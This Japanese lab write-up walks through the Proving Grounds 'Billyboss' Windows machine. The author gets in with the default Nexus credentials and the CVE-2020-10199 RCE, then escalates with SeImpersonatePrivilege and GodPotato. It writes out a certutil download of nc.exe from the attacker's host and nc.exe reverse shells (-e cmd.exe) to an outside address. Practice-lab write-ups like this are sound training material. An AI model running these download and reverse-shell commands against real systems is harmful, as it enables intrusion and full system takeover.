---
title: "Proving Grounds - Billyboss (Windows)"
date: 2026-03-11
description: "Proving Grounds Billyboss Windows マシン解説。Nexus Repository Manager RCE (CVE-2020-10199) と SeImpersonatePrivilege + GodPotato による権限昇格を解説。"
categories: [Proving Grounds, Windows]
tags: [nexus, rce, cve-2020-10199, seimpersonate, godpotato, privilege-escalation]
mermaid: true
content_lang: ja
alt_en: /posts/pg-billyboss/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Windows |
| 難易度 | 記録なし |
| 攻撃対象 | Nexus Repository Manager (ポート 8081) |
| 主な侵入経路 | Nexus RCE (CVE-2020-10199) + 弱い認証情報 |
| 権限昇格経路 | SeImpersonatePrivilege → GodPotato → SYSTEM |

## 認証情報

| ユーザー名 | パスワード | 発見元 |
|----------|----------|--------|
| nexus    | nexus    | デフォルト認証情報 (cewl wordlist で発見) |

## 偵察

---
💡 なぜ有効か
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
Open 192.168.178.61:21
Open 192.168.178.61:80
Open 192.168.178.61:135
Open 192.168.178.61:139
Open 192.168.178.61:445
Open 192.168.178.61:8081
```

```bash
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: BaGet
8081/tcp  open  http          Jetty 9.4.18.v20190429
| http-robots.txt: 2 disallowed entries
|_/repository/ /service/
|_http-title: Nexus Repository Manager
|_http-server-header: Nexus/3.21.0-05 (OSS)
```

## 初期足がかり

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

FTP匿名ログインとSMB匿名アクセスはいずれも拒否された。cewlでNexus WebインターフェースからWordlistを生成:

```bash
cewl http://$ip:8081 -d 4 -m 5 -w cewl2.txt
```

```bash
Nexus
Repository
Manager
```

`nexus:nexus` でログイン成功。既知のRCEエクスプロイトを発見:

```bash
searchsploit sonatype
```

```bash
Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)   | java/webapps/49385.py
```

エクスプロイトを修正して、まずnc.exeを転送してからリバースシェルを確立:

```bash
# Step 1: nc.exe 転送
URL='http://192.168.178.61:8081'
CMD='certutil.exe -urlcache -split -f http://192.168.45.166:8001/nc.exe nc.exe'
USERNAME='nexus'
PASSWORD='nexus'
```

```bash
python3 49385.py
```

```bash
Logging in
Logged in successfully
Command executed
```

```bash
# Step 2: リバースシェル
URL='http://192.168.178.61:8081'
CMD='.\\nc.exe 192.168.45.166 4444 -e cmd.exe'
USERNAME='nexus'
PASSWORD='nexus'
```

```bash
nc -lvnp 4444
```

```bash
connect to [192.168.45.166] from (UNKNOWN) [192.168.178.61] 61477
Microsoft Windows [Version 10.0.18362.719]

C:\Users\nathan\Nexus\nexus-3.21.0-05>
```

local.txt取得:

```bash
c:\Users\nathan\Desktop>type local.txt
b84cfd99205127ae1830d9608ba46322
```

💡 なぜ有効か
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

`SeImpersonatePrivilege` が有効化されており、DCOMも有効だった:

```powershell
PS C:\Users\nathan\Downloads\win_tool> whoami /priv
```

```bash
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

```powershell
Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" | Select-Object EnableDCOM
```

```bash
EnableDCOM
----------
Y
```

GodPotatoでSYSTEMに昇格:

```powershell
.\GodPotato.exe -cmd ".\nc.exe 192.168.45.166 4445 -e cmd.exe"
```

```bash
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1176
```

```bash
nc -lvnp 4445
```

```bash
connect to [192.168.45.166] from (UNKNOWN) [192.168.178.61] 61484
Microsoft Windows [Version 10.0.18362.719]

C:\Windows\system32>
```

```bash
c:\Users\Administrator\Desktop>type proof.txt
7630749e8cf7be4016112cf6b24a0a15
```

💡 なぜ有効か
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## まとめ・学んだこと

- すべてのリポジトリマネージャー (Nexus, Artifactory等) でデフォルト認証情報を変更する。
- パッチを速やかに適用する — CVE-2020-10199 は Nexus の重大な認証後 RCE。
- SeImpersonatePrivilege を持つサービスは Windows でよくある権限昇格経路 — この権限を慎重に制限する。
- アプリケーションに不要であれば DCOM を無効化または制限する。

### Attack Flow

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```mermaid
flowchart LR
  subgraph SCAN["🔍 スキャン"]
    direction TB
    S1["rustscan\n全ポート列挙\n21/80/445/8081"]
    S2["nmap\nNexus 3.21.0 @ 8081\nJetty 9.4.18"]
    S1 --> S2
  end

  subgraph INITIAL["💥 初期侵入"]
    direction TB
    I1["FTP / SMB\n匿名アクセス試行\n→ 失敗"]
    I2["cewl\nhttp://\$ip:8081 -d 4 -m 5\n→ wordlist生成"]
    I3["Nexus ログイン\nnexus:nexus\n認証成功"]
    I4["searchsploit sonatype\nCVE-2020-10199\n49385.py"]
    I5["certutil\nnc.exe ダウンロード\nhttp://kali:8001/nc.exe"]
    I6["49385.py 実行\nnc.exe リバースシェル\n→ shell as nathan"]
    I7["🚩 local.txt\nb84cfd99..."]
    I1 --> I2 --> I3 --> I4 --> I5 --> I6 --> I7
  end

  subgraph PRIVESC["⬆️ 権限昇格"]
    direction TB
    P1["whoami /priv\nSeImpersonatePrivilege\nEnabled"]
    P2["DCOM 確認\nEnableDCOM = Y"]
    P3["GodPotato\nnc.exe リバースシェル\n→ NT AUTHORITY\\SYSTEM"]
    P4["🚩 proof.txt\n7630749e..."]
    P1 --> P2 --> P3 --> P4
  end

  SCAN --> INITIAL --> PRIVESC
```

## 参考文献

- CVE-2020-10199: https://nvd.nist.gov/vuln/detail/CVE-2020-10199
- Exploit 49385: https://www.exploit-db.com/exploits/49385
- GodPotato: https://github.com/BeichenDream/GodPotato
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- CeWL: https://github.com/digininja/CeWL
